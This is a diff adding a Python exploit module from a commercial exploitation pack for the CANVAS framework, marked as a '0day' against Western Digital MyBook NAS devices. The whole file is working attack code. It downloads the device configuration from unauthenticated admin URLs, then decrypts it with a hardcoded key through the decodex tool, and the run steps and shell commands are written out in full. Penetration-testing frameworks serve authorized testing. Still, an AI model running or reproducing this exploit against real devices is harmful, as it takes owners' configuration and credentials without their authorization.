@@ -1,0 +1,110 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2013
+#
+
+import sys, time, os, re
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+import libs.spkproxy as spkproxy
+
+
+NAME = "d2sec_wdmybook_2"
+VERSION = "0.1"
+DESCRIPTION = "[0day] Western Digital MyBook NAS Information Disclosure Vulnerability"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"], ["Windows"], ["Solaris"], ["AIX"], ["FreeBSD"], ["MacOSX"], ["HP-UX"] ]
+
+DOCUMENTATION = {}
+DOCUMENTATION["Versions Affected"] = "01.02.14"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Date public"] = ""
+DOCUMENTATION["References"] = ""
+DOCUMENTATION["CVE Name"] = ""
+DOCUMENTATION["CVE Url"] = ""
+DOCUMENTATION["Notes"] = "Download Western Digital MyBook NAS configuration without authentication" 
+
+
+class theexploit (tcpexploit):
+    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.setInfo(DESCRIPTION)
+    self.name = NAME
+    self.host = ''
+    self.port = 443
+    self.extraheaders = [("User-Agent", "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)")]
+    self.path = '3rdparty/D2SEC/exploits/d2sec_wdmybook_2/Resources'
+    self.os = "Linux"
+	
+  def getargs(self):	
+    self.host = self.target.interface
+    self.os = self.argsDict.get("os",self.os)
+
+  def exploit_1(self):
+    self.log('[D2] Downloading config.xml in %s'%self.path)
+    try:
+      handle = spkproxy.urlopen('https://%s/admin/config.xml'%self.host, extraheaders=self.extraheaders)
+      open('%s/config.xml'%self.path, 'w').write(handle.read())
+    except Exception, e:
+      self.log('[D2] %s' % e)
+      return 0
+    return 1
+
+  def exploit_2(self):
+    self.log('[D2] Downloading config.xtx in %s'%self.path)
+    from libs.canvasos import canvasos
+    try:
+      handle = spkproxy.urlopen('https://%s/admin/system_download_config.php'%self.host, extraheaders=self.extraheaders)
+      open('%s/config.xtx'%self.path, 'w').write(handle.read())
+    except Exception, e:
+      self.log('[D2] %s' % e)
+      return 0
+    decode = ''
+    if self.os == "Linux":
+      decode = "decodex"
+    elif self.os == "Windows":
+      decode = "decodex.exe"
+    else:
+      self.log("[D2] No available binary to decodex config.xtx")
+      self.log("[D2] Download decodex sources at http://www.geodyssey.com/cryptography/codex.zip")
+      self.log("[D2] Run these commands :")
+      self.log("[D2] $ ./decodex -k=\"Nj1e2w0a0b\" config.xtx config.xml.tar")
+      self.log("[D2] $ tar xvf config.xml.tar")
+      return 1
+    self.log('[D2] Decodex config.xtx')
+    os.system("cd %s && ./%s -k=\"Nj1e2w0a0b\" config.xtx config.xml.tar"%(self.path, decode))
+    self.log('[D2] %s/config.xml.tar is available'%self.path)
+    return 1
+
+  def run(self):
+    self.getargs()
+    self.setInfo('[D2] %s attacking %s:%d' % (NAME,self.host,self.port)) 
+    if not self.exploit_1():
+      if not self.exploit_2():
+        self.log('[D2] %s is not vulnerable' % self.host)
+        return 0
+    self.setInfo('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
+    return 1
+
+  def usage(self):
+    print "Usage: "+sys.argv[0]+" -t target" 
+    sys.exit(0)
+    
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME,VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
